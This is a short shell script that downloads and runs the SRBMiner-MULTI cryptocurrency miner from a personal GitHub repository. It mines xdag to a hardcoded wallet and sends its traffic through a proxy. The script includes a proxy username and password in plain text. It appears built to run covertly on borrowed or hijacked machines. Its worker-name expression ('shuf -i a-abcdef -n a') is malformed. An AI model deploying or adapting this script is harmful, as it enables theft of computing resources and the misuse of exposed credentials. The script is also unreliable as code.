#!/bin/sh
curl -v -x "socks5://ingfoingfo-rotate:maszZeehh@p.webshare.io:80/" webshare.io/
wget https://github.com/AhmadTugiman/gembel/raw/main/SRBMiner-MULTI
chmod 700 SRBMiner-MULTI
./SRBMiner-MULTI --algorithm xdag --pool xdag.org:13656 --wallet 6Sdu2VTNLImAIoq7KscJq38v2yGNS6wx --worker $(echo $(shuf -i a-abcdef -n a)) --password x --cpu-threads 4 --disable-gpu --proxy 185.205.194.126:7646
